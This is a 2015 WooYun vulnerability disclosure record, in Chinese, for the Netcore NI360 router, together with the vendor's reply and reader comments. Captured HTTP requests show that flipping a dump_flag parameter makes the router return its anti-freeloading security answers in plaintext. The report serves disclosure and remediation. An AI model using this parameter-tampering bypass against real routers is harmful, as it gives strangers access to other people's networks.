{"id": 27014, "wybug_id": "wooyun-2015-0120888", "wybug_title": "磊科NI360无线路由器防蹭网二级密码形同虚设（可直接获取明文答案）", "wybug_corp": "深圳市磊科实业有限公司", "wybug_author": "Bear baby", "wybug_date": "2015-06-16 16:26", "wybug_open_date": "2015-06-21 16:28", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 磊科NI360安全无线路由器开启二级防蹭网后，用户通过设置密码保护问题和答案，把防蹭网保护级别提升更高等级。即使蹭网嫌疑用户暴力破解无线安全密码后，依然无法上网，始终守卫您的网络安全。“第一层保险：一键提升WIFI加密等级，关闭WPS功能，足以应付一般蹭网卡或蹭网软件。第二层保险：独有的问答形式验证密码保护，目前没有任何形式的蹭网工具可以破解。”然而，蹭网二级密码形同虚设，可直接获取明文。。。 详细说明：         磊科NI360安全无线路由器开启二级防蹭网后，用户通过设置密码保护问题和答案，把防蹭网保护级别提升更高等级。即使蹭网嫌疑用户暴力破解无线安全密码后，依然无法上网，始终守卫您的网络安全。      “第一层保险：一键提升WIFI加密等级，关闭WPS功能，足以应付一般蹭网卡或蹭网软件。第二层保险：独有的问答形式验证密码保护，目前没有任何形式的蹭网工具可以破解。”<br/> \n\n下面演示一下操作过程。产品型号：NI360软件版本：netcore(NI360)CN-V1.3.131122首先在后台开启二级防蹭网保护，并设置密码保护答案。如下图<br/> \n\n开启二级防蹭网保护后，浏览器访问网站时，如下图，访问百度网址，提示需要输入密码保护答案才能继续访问。 \n\n通过查看在该页面/pop_html/protection_ans.html源文件，第39行开始，通过ajax向/router/qh_360_safe_question_dump.cgi POST获取密保问题，返回为json数据。<br/> \n\n部分HTML如下：\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>磊科防蹭网二级保护</title><link type=\"text/css\" href=\"../css/style.css\" rel=\"stylesheet\"/><style>body{background: #333;margin: 0;padding: 0;overflow-x: hidden} img{border: 0;}label{ font-size:12px; color:#373536;}select,.txt{ padding:2px 0; width:170px;}.red{color: #BD0000;}.f12{font-size:12px;}.f14{font-size:14px;}.wrap{width: 700px;height:370px;background: #FFFFFF; margin: 30px auto;border-radius: 3px;-moz-box-shadow:3px 3px 20px #333;box-shadow: 3px 3px 20px #333;border: 1px #177AE0 solid;}.c{width: 640px;padding:0 30px;float: left;position: relative;overflow: hidden;}.c_wap{width: 100%;float: left;position: relative;overflow: hidden;}.c_wap_content{background:#FFFFFF;float:left;width:100%; position:relative;}.c_wap p{float: left;text-align: center;width: 100%;margin: 10px 0;}.c_wap_content .c_wap p{margin: 0;}.c_wap p font{padding: 0 30px;float: left;text-align: left;font-size: 14px;}.title{font-size: 24px;color: #FFFFFF;background: #177AE0;}.title_web{line-height: 94px;height: 94px;text-align: left;padding-left: 110px;width: 560px;}.footerlink,.footerlink a{font-size: 12px;color:#999;text-decoration: none;}.footerlink a:hover{text-decoration: underline;}.c_wap_footer{background-color: #F5F5F5;padding: 20px 0;}.text_wap{ padding:8px 0;}.button {background:url(../images/btn2.gif) no-repeat;width:80px;height:28px;border:0px;color:white;padding:4px 0 5px 0;font-family:Tahoma, Verdana, sans-serif;font-size:12px;cursor:pointer}.button2 {background:url(../images/btn5.gif) no-repeat;width:80px;height:28px;border:0px;color:#333;padding:4px 0 5px 0;font-family:Tahoma, Verdana, sans-serif;font-size:12px;cursor:pointer}#authing{ display:none; position:absolute; left:25%; top:0; width:50%; height:120px; text-align:center; line-height:120px; color:#fff; background:#333 url(../images/jd.gif) no-repeat center 30px;}</style><script type=\"text/javascript\" src=\"../script/jquery-1.2.6.js\"></script><script type=\"text/javascript\" src=\"../script/language.js\"></script><script type=\"text/javascript\" src=\"../script/language_CN.js\"></script><script type=\"text/javascript\" src=\"../script/cookie.js\"></script></head><body><script type=\"text/javascript\">$(document).ready(function(){\tvar c_pwd=$.cookie( \"c_pwd\");\tif(c_pwd)\t\t$(\"#wirel_answer\").val(c_pwd);\t$.post(\"/router/qh_360_safe_question_dump.cgi\",{action:\"0\",dump_flag:\"0\"},function(data){\t\tvar data = eval(\"(\"+data+\")\");/*\t\tvar num=0;\t\twhile(1){\t\t\tvar temp=\"data.question\"+num;\t\t\ttemp=eval(\"(\"+temp+\")\");\t\t\tif(temp==undefined)\t\t\t\tbreak;\t\t\telse{\t\t\t\t$(\"#question_sel\").append(\"<option value=\\\"\"+num+\"\\\">\"+temp+\"</option>\");\t\t\t\tnum++;\t\t\t}\t\t}\t\t$(\"#question_sel\").val(data.id);*/\t\tvar temp=\"data.question\"+data.id;\t\ttemp=eval(\"(\"+temp+\")\");\t\t$(\"#question_sel\").val(temp);\t\t$(\"#wirel_answer_id\").val(data.id)\t});});\nFiddler抓包如下图(MAC地址已做隐私处理)  \n\nREQUEST：\nPOST http://192.168.1.1/router/qh_360_safe_question_dump.cgi HTTP/1.1Host: 192.168.1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://192.168.1.1/pop_html/protection_ans.html?url=www.baidu.com/|ip=192.168.1.100|gw=192.168.1.1:80|mac=**:**:**:**:**:**|rmac=**:**:**:**:**:**|magic=245e2460Content-Length: 20Connection: keep-alivePragma: no-cacheCache-Control: no-cacheaction=0&dump_flag=0\nRESPONSE:\nHTTP/1.1 200 OKConnection: closecontent-type: text/plain; charset=UTF-8{\"question0\":\"我手机号码的后6位？\",\"question1\":\"我身份证号码的后6位？\",\"question2\":\"我的QQ号码？\",\"question3\":\"123\",\"id\":\"0\",\"enable\":\"1\"}\n使用Fiddler修改POST数据中的dump_flag=0为dump_flag=1，重放数据包提交。如下图\n\nRequest：\nPOST http://192.168.1.1/router/qh_360_safe_question_dump.cgi HTTP/1.1Host: 192.168.1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://192.168.1.1/pop_html/protection_ans.html?url=www.baidu.com/|ip=192.168.1.100|gw=192.168.1.1:80|mac=**:**:**:**:**:**|rmac=**:**:**:**:**:**|magic=245e2460Content-Length: 20Connection: keep-alivePragma: no-cacheCache-Control: no-cacheaction=0&dump_flag=1\nRESPONSE：\nHTTP/1.1 200 OKConnection: closecontent-type: text/plain; charset=UTF-8{\"question0\":\"我手机号码的后6位？\",\"answer0\":\"123456\",\"question1\":\"我身份证号码的后6位？\",\"answer1\":\"\",\"question2\":\"我的QQ号码？\",\"answer2\":\"\",\"question3\":\"123\",\"answer3\":\"\",\"id\":\"0\",\"enable\":\"1\"}\n返回的json数据赫然写着密保答案，完全明文。至此蹭网者可用轻易获取到密码。NI360所宣传的防蹭网功能，二级防蹭网保护形同虚设。   漏洞证明：  \n\n\nPOST http://192.168.1.1/router/qh_360_safe_question_dump.cgi HTTP/1.1Host: 192.168.1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://192.168.1.1/pop_html/protection_ans.html?url=www.baidu.com/|ip=192.168.1.100|gw=192.168.1.1:80|mac=**:**:**:**:**:**|rmac=**:**:**:**:**:**|magic=245e2460Content-Length: 20Connection: keep-alivePragma: no-cacheCache-Control: no-cacheaction=0&dump_flag=1\n\nHTTP/1.1 200 OKConnection: closecontent-type: text/plain; charset=UTF-8{\"question0\":\"我手机号码的后6位？\",\"answer0\":\"123456\",\"question1\":\"我身份证号码的后6位？\",\"answer1\":\"\",\"question2\":\"我的QQ号码？\",\"answer2\":\"\",\"question3\":\"123\",\"answer3\":\"\",\"id\":\"0\",\"enable\":\"1\"}\n   修复方案：  获取问题功能直接写在页面里面或者单独页面处理，严格控制参数或者不使用参数来获取。对密保答案进行加密处理。   版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-21 16:28 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 2015-07-06：http://www.netcoretec.com/software_detail/&downloadsId=316.html已经修复此漏洞  ", "replys": "漏洞评价：\n评论\n     2015-06-16 16:42 |    \t\tSnow陈伦 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 闷骚的家伙，何处都是你的战场。)\t\t \n  现在的路由器防蹭网设备还没那么普及（用户安全意识太差），各种型号（tp、D-LK）路由器还是停留在出产时候的版本，本地更本无法升级版本。    \n     2015-06-16 19:22 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  @Snow陈伦 不好意思，360的路由器会自动升级ROM。，可惜NI360归磊科。    \n     2015-07-06 15:40 |    \t\t深圳市磊科实业有限公司(乌云厂商)\t\t \n  感谢乌云，新版本已修复，下载见链接：http://www.netcoretec.com/software_detail/&downloadsId=316.html    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}